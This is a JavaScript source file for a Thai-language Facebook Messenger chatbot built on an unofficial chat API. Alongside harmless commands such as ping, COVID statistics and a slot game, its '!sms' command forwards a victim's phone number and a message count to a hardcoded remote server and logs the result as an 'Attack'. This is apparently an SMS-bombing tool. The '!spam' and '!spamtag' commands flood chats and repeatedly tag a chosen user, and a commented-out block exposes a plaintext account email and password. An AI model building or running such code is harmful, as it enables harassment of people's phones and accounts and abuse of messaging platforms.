const login = require("facebook-chat-api");
const fs = require("fs");
const axios = require("axios");
const cryptoRandomString = require('crypto-random-string');
var random_useragent = require('random-useragent');
var jsonfile = require('jsonfile');
var tcpp = require('tcp-ping');
//======================================================

/*login({email: "viwox34680@laklica.com", password: "0612204156"}, (err, api) => {
    if(err) return console.error(err);
    console.log("===== LOGIN SUCCESS =====\n");
fs.writeFileSync('appstate.json', JSON.stringify(api.getAppState()));
});*/

//======================================================
console.log("[OK] Bot is running success");
async function sendsms(phonenumber,count,service) {
	await axios.get('http://198.98.50.123:5555/?key=pieapple&phonenumber='+phonenumber+'&count='+count+'&service='+service)
	.then(function (response) {
		console.log('Attack'+ response.data[0].massage);
	}) .catch(function (error) {
		console.log('Attack'+ error.data);
	});	
}
login({ appState: JSON.parse(fs.readFileSync('appstate.json', 'utf8')) }, (err, api) => {
    if (err) return console.error(err);

    api.setOptions({ listenEvents: true });

    var stopListening = api.listenMqtt((err, event) => {
        if (err) return console.error(err);

        switch (event.type) {
            case "message":
                // if (event.isGroup == true) {
                var body = event.body.split(' ');
                if (event.body === '!help') {
                    var d = new Date();
                    api.sendMessage({
                        body: "‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î!!\n‚úñ ùòºùô°ùô° ùôòùô§ùô¢ùô¢ùôñùô£ùôô ‚úñ‚û§ \n‚û§ !ping\n‚û§ !speed\n‚û§ !covid\n‚û§ !myid\n‚û§ !spam [‡∏Ñ‡∏≥] [‡∏à‡∏≥‡∏ô‡∏ß‡∏ô]\n‚û§ !spamtag [‡∏à‡∏≥‡∏ô‡∏ß‡∏ô] [@‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏ô]\n‚û§ !sms [‡πÄ‡∏ö‡∏≠‡∏£‡πå] [‡∏à‡∏≥‡∏ô‡∏ß‡∏ô] [ais | monomax]\n‚û§ !addword [‡∏Ñ‡∏≥‡∏ñ‡∏≤‡∏°] | [‡∏Ñ‡∏≥‡∏ï‡∏≠‡∏ö]\n‚û§ !removeword [‡∏Ñ‡∏≥‡∏ñ‡∏≤‡∏°]\n‚û§ !setemoji [‡∏≠‡∏¥‡πÇ‡∏°‡∏à‡∏¥]\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\nùó©ùó≤ùóøùòÄùó∂ùóºùóª : ùü±.ùü¨.ùü¨\nTime : " + d.toLocaleTimeString() + "\nùóòùó±ùó∂ùòÅ ùóïùòÜ : ùóôùó≤ùó≤ùòáùó∂ùóÆùóπ ",
                        mentions: [{
                            tag: "Feezial",
                            id: "100011409407326",
                        }],
                    }, event.threadID);
                    api.setMessageReaction("üòç", event.messageID)
                } else if (event.body === '!ping') {
                    api.sendMessage("Pong!", event.threadID);
                    api.setMessageReaction("üòç", event.messageID)
                } else if (event.body === '!test') {
                    var http = require('http');
                    api.sendMessage("tooekwporkf!", event.threadID);
                    api.setMessageReaction("üòç", event.messageID)
                }
                 else if (body['0'] === '!spam') {
                    if (body['1'] == undefined) {
                        api.sendMessage("‡∏ß‡∏¥‡∏ò‡∏µ‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô\n!spam [‡∏Ñ‡∏≥] [‡∏à‡∏≥‡∏ô‡∏ß‡∏ô]\n‡πÄ‡∏ä‡πà‡∏ô !spam ‡πÑ‡∏≠‡πâ‡∏Ñ‡∏ô‡∏ô‡πà‡∏≤‡∏£‡∏±‡∏Å 5", event.threadID);
                    } else if (body['2'] > 5) {
                        api.sendMessage("‡∏Å‡∏£‡∏∏‡∏ì‡∏≤‡∏Å‡∏£‡∏≠‡∏Å‡∏à‡∏≥‡∏ô‡∏ß‡∏ô‡∏ô‡πâ‡∏≠‡∏¢‡∏Å‡∏ß‡πà‡∏≤ 5", event.threadID);
                    } else {
                        for (var i = 0; i < body['2']; i++) {
                            api.sendMessage(body['1'], event.threadID);
                        }
                        api.setMessageReaction("üòç", event.messageID)
                    }
                } else if (body['0'] === '!sms') {
                    var services = ['ais','monomax','random'];
					var phonenumber = body['1'];
					var count = body['2'];
					var service = body['3'];
					if (phonenumber == undefined | phonenumber == ''){
						api.sendMessage("‡∏Å‡∏£‡∏∏‡∏ì‡∏≤‡πÉ‡∏™‡πà‡πÄ‡∏ö‡∏≠‡∏£‡πå", event.threadID);
						api.setMessageReaction("üò†",event.messageID)
					} else if (phonenumber.length != 10) {
						api.sendMessage("‡∏Å‡∏£‡∏∏‡∏ì‡∏≤‡πÉ‡∏™‡πà‡πÄ‡∏ö‡∏≠‡∏£‡πå‡πÉ‡∏´‡πâ‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á", event.threadID);
						api.setMessageReaction("üò†",event.messageID)
					} else if (count == '' | count == undefined | count < 0 | count > 50) {
						api.sendMessage("‡∏Å‡∏£‡∏∏‡∏ì‡∏≤‡πÉ‡∏™‡πà‡∏à‡∏≥‡∏ô‡∏ß‡∏ô‡∏ï‡πà‡∏≥‡∏Å‡∏ß‡πà‡∏≤ 50", event.threadID);
						api.setMessageReaction("üò†",event.messageID)
					} else if (service == '' | service == undefined | !services.includes(service)) {
						api.sendMessage("‡∏Å‡∏£‡∏∏‡∏ì‡∏≤‡πÉ‡∏™‡πà " + services , event.threadID);
						api.setMessageReaction("üò†",event.messageID)
					} else {
						sendsms(phonenumber,count,service);
						api.sendMessage("‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏™‡πà‡∏á‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡πÑ‡∏õ‡∏ó‡∏µ‡πà\n‡πÄ‡∏ö‡∏≠‡∏£‡πå: " + phonenumber + '\n‡∏à‡∏≥‡∏ô‡∏ß‡∏ô: '+ count + ' ‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°\n‡∏ö‡∏£‡∏¥‡∏Å‡∏≤‡∏£: '+ service, event.threadID);
						api.setMessageReaction("üòÜ",event.messageID);
					}
				}
                else if (event.body == "!myid") {
                    api.sendMessage("senderID ‡∏Ç‡∏≠‡∏á‡∏Ñ‡∏∏‡∏ì‡∏Ñ‡∏∑‡∏≠\n" + event.senderID, event.threadID);
                    api.setMessageReaction("üòÜ", event.messageID)
                }
                 else if (event.body == "!covid") {
                    axios({
                        method: 'get', 
                        url: 'https://covid19.th-stat.com/api/open/today',
                    }).then(function (response) {
                        api.sendMessage("‡∏£‡∏≤‡∏¢‡∏á‡∏≤‡∏ô‡πÇ‡∏Ñ‡∏ß‡∏¥‡∏î‡∏ß‡∏±‡∏ô‡∏ô‡∏µ‡πâ !\n‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î : " + response.data.Confirmed + " \n‡πÄ‡∏™‡∏µ‡∏¢‡∏ä‡∏µ‡∏ß‡∏¥‡∏ï : " + response.data.Deaths + "\n‡∏ú‡∏π‡πâ‡∏ï‡∏¥‡∏î‡πÉ‡∏´‡∏°‡πà : " + response.data.NewConfirmed + "\n‡∏•‡πà‡∏≤‡∏™‡∏∏‡∏î : " + response.data.UpdateDate, event.threadID);
                        api.setMessageReaction("üòç", event.messageID)
                    })
                } 
                else if (body['0'] == "!setemoji") {
                    if (body['1'] == undefined) {
                        api.sendMessage("‡∏ß‡∏¥‡∏ò‡∏µ‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô\n!setemoji [‡∏≠‡∏¥‡πÇ‡∏°‡∏à‡∏¥]\n‡πÄ‡∏ä‡πà‡∏ô !emoji üíØ", event.threadID);
                        api.setMessageReaction("üòÜ", event.messageID)
                    } else {
                        api.changeThreadEmoji(body['1'], event.threadID, (err) => {
                            if (err) return api.sendMessage("‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÄ‡∏õ‡∏•‡∏∑‡πà‡∏¢‡∏ô‡πÄ‡∏õ‡πá‡∏ôemoji‡∏ô‡∏µ‡πâ‡πÑ‡∏î‡πâ!!", event.threadID);
                            api.sendMessage("‡πÄ‡∏õ‡∏•‡∏∑‡πà‡∏¢‡∏ôemoji‡πÄ‡∏õ‡πá‡∏ô" + body['1'] + "‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à‡πÅ‡∏•‡πâ‡∏ß", event.threadID);
                            api.setMessageReaction("üòÜ", event.messageID)
                        });
                    }

                } 
                else if (body['0'] == "!nick") {
                    if (body['1']== undefined) {
                        api.changeNickname(body['1'], event.threadID, event.senderID, (err) => {
                            if (err) return console.error(err);
                        });
                    } else{
                        if(body['1'].startsWith("@")){
                            var keys = Object.keys(event.mentions);
                            api.changeNickname(body['0'], event.threadID, keys['1'], (err) => {
                                if (err) return console.error(err);
                                api.setMessageReaction("üòÜ", event.messageID)
                            });
                        }else{
                            api.sendMessage("‚úñ ‡πÉ‡∏™‡πà‡πÅ‡∏ó‡πá‡∏Ñ‡πÉ‡∏´‡πâ‡∏î‡∏µ‡πÑ‡∏≠‡πâ‡πÄ‡∏´‡∏µ‡πâ‡∏¢", event.threadID);
                            api.setMessageReaction("üòÜ", event.messageID)
                        }
                
                    }

                } 
                else if (event.body == "!meme") {
                    axios({
                        method: 'get',
                        url: 'https://api.imgflip.com/get_memes' + Math.floor(Math.random() * 10),
                    }).then(function (response) {
                        var msg = {
                            body: "‡∏≠‡∏∞‡πÄ‡∏≠‡∏≤‡πÑ‡∏õ‡∏°‡∏µ‡∏°‡∏´‡∏•‡πà‡∏≠‡πÄ‡∏ó‡πà‡∏´‡πå‡πÜ",
                            attachment: fs.createReadStream(__dirname + '/duck.png')
                        }
                        console.log(response.data.data[Math.floor(Math.random() * 10)].image)
                        api.sendMessage(msg, event.threadID);
                    })
                } else if (body['0'] == "!spamtag") {
                    var keys = Object.keys(event.mentions);
                    if (body['2'] == undefined) {
                        api.sendMessage("‡∏ß‡∏¥‡∏ò‡∏µ‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô\n!spamtag [‡∏à‡∏≥‡∏ô‡∏ß‡∏ô] [@‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏ô]\n‡πÄ‡∏ä‡πà‡∏ô !spamtag 5 @Chok teparit", event.threadID);
                    } else if (body['1'] > 10) {
                        api.sendMessage("‡∏Å‡∏£‡∏∏‡∏ì‡∏≤‡∏Å‡∏£‡∏≠‡∏Å‡∏à‡∏≥‡∏ô‡∏ß‡∏ô‡∏ô‡πâ‡∏≠‡∏¢‡∏Å‡∏ß‡πà‡∏≤ 10", event.threadID);
                    } else if (keys[0] == undefined) {
                        api.sendMessage("‡∏Å‡∏£‡∏∏‡∏ì‡∏≤‡πÅ‡∏ó‡πä‡∏Å‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏ô", event.threadID);
                    } else {
                        for (var i = 0; i < body['1']; i++) {
                            api.sendMessage({
                                body: body['2'] + ' ‡∏ú‡∏°‡∏Ç‡∏≠‡πÅ‡∏ó‡πä‡∏Å‡πÄ‡∏£‡∏µ‡∏¢‡∏Å‡∏´‡∏ô‡πà‡∏≠‡∏¢‡∏ô‡πâ‡∏≤‡∏≤',
                                mentions: [{
                                    tag: body['2'],
                                    id: keys[0],
                                }],
                            }, event.threadID);
                        }

                        api.setMessageReaction("üòç", event.messageID)
                    }
                } else if (event.body == "!slot") {
                    var emojis = [
                        'üëΩ', '‚úäüèø', 'üçé', 'üçí', 'üçì'
                    ];
                    emojiresult1 = emojis[Math.floor(Math.random() * emojis.length)];
                    emojiresult2 = emojis[Math.floor(Math.random() * emojis.length)];
                    emojiresult3 = emojis[Math.floor(Math.random() * emojis.length)];
                    emojiresult4 = emojis[Math.floor(Math.random() * emojis.length)];
                    if (emojiresult1 == emojiresult2 && emojiresult2 == emojiresult3 && emojiresult3 == emojiresult4) {
                        api.sendMessage("‡∏ú‡∏•‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡∏™‡∏•‡πá‡∏≠‡∏ï‡πÅ‡∏°‡∏ä‡∏ä‡∏µ‡∏ô :\n | " + emojiresult1 + " | " + emojiresult2 + " | " + emojiresult3 + " | " + emojiresult4 + " |", event.threadID, function (err) {
                            if (err) return api.sendMessage(err, event.threadID);
                            api.sendMessage("‡∏™‡∏∏‡∏î‡∏¢‡∏≠‡∏î‡πÑ‡∏õ‡πÄ‡∏•‡∏¢‡∏¢‡∏¢", event.threadID);
                            console.log("WINNER JACKPOT");
                        });
                    } else {
                        api.sendMessage("‡∏ú‡∏•‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡∏™‡∏•‡πá‡∏≠‡∏ï‡πÅ‡∏°‡∏ä‡∏ä‡∏µ‡∏ô :\n | " + emojiresult1 + " | " + emojiresult2 + " | " + emojiresult3 + " | " + emojiresult4 + " |", event.threadID, function (err) {
                            if (err) return api.sendMessage(err, event.threadID);
                            api.sendMessage("‡∏•‡∏≠‡∏á‡πÉ‡∏´‡∏°‡πà‡∏≠‡∏µ‡∏Å‡∏™‡∏±‡∏Å‡∏ï‡∏≤‡∏î‡∏π", event.threadID);
                        });
                        console.log("[SLOT] SLOT is running");
                    }
                } else if (body['0'] == "!addword") {
                    var answer = event.body.split(' | ');
                    if (body['1'] == undefined) {
                        api.sendMessage("‡∏Å‡∏£‡∏∏‡∏ì‡∏≤‡πÉ‡∏™‡πà‡∏Ñ‡∏≥‡∏ñ‡∏≤‡∏°", event.threadID);
                    } else if (answer['1'] == undefined) {
                        api.sendMessage("‡∏Å‡∏£‡∏∏‡∏ì‡∏≤‡πÉ‡∏™‡πà‡∏Ñ‡∏≥‡∏ï‡∏≠‡∏ö", event.threadID);
                    } else {
                        rawdata = fs.readFileSync('question.json');
                        question = JSON.parse(rawdata);
                        answerjson = question.filter(item => {
                            return item.question === body['1'];
                        })
                        if (answerjson[0] == undefined) {
                            question.push({ "question": body['1'], "answer": answer['1'] });
                            jsonfile.writeFile('question.json', question, { spaces: 2 }, function (err) {
                                if (err) return api.sendMessage("‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏Ñ‡∏≥‡∏ó‡∏µ‡πà‡∏°‡∏µ emoji ‡πÑ‡∏î‡πâ!!", event.threadID);
                                api.sendMessage("‡∏Ç‡∏≠‡∏ö‡∏Ñ‡∏∏‡∏ì‡∏ó‡∏µ‡πà‡∏™‡∏≠‡∏ô‡∏ô‡∏∞!!", event.threadID);
                            });
                        } else {
                            api.sendMessage("‡∏°‡∏µ‡∏Ñ‡∏≥‡∏ñ‡∏≤‡∏°‡∏ô‡∏µ‡πâ‡∏≠‡∏¢‡∏π‡πà‡πÅ‡∏•‡πâ‡∏ß!!", event.threadID);
                        }
                    }
                } else if (body['0'] == "!removeword") {
                    if (body['1'] == undefined) {
                        api.sendMessage("‡∏Å‡∏£‡∏∏‡∏ì‡∏≤‡πÉ‡∏™‡πà‡∏Ñ‡∏≥‡∏ñ‡∏≤‡∏°‡∏ó‡∏µ‡πà‡∏ï‡πâ‡∏≠‡∏á‡∏Å‡∏≤‡∏£‡∏•‡∏ö!!", event.threadID);
                    } else {
                        rawdata = fs.readFileSync('question.json');
                        question = JSON.parse(rawdata);
                        result = 0;
                        for (i = 0; i < question.length; i++) {
                            if (question[i].question == body['1']) {
                                question.splice(i, 1);
                                result++;
                            }
                        }
                        jsonfile.writeFile('question.json', question, { spaces: 2 }, function (err) {
                            if (err) return api.sendMessage(err, event.threadID);
                            if (result > 0) {
                                api.sendMessage("‡∏•‡∏ö‡∏Ñ‡∏≥‡∏ñ‡∏≤‡∏°‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à‡πÅ‡∏•‡πâ‡∏ß!!", event.threadID);
                            } else {
                                api.sendMessage("‡πÑ‡∏°‡πà‡∏û‡∏ö‡∏Ñ‡∏≥‡∏ñ‡∏≤‡∏°‡∏ô‡∏µ‡πâ!!", event.threadID);
                            }
                        });
                    }
                } else {
                    rawdata = fs.readFileSync('question.json');
                    question = JSON.parse(rawdata);
                    answerjson = (question.filter(item => {
                        return item.question === event.body;
                    }))
                    if (answerjson[0] == undefined) {
                        console.log(event);
                    } else {
                        api.sendMessage(answerjson[0].answer, event.threadID);
                    }
                }
                // }else{
                // 	api.sendMessage("‡∏ï‡∏≠‡∏ö‡πÄ‡∏â‡∏û‡∏≤‡∏∞‡∏Å‡∏•‡∏∏‡πà‡∏°‡πÄ‡∏ó‡πà‡∏≤‡∏ô‡∏±‡πâ‡∏ô‡∏à‡πâ‡∏≤‡∏≤", event.threadID);
                // }
                api.markAsRead(event.threadID);
                break;
            case "event":
                break;
        }
    });
});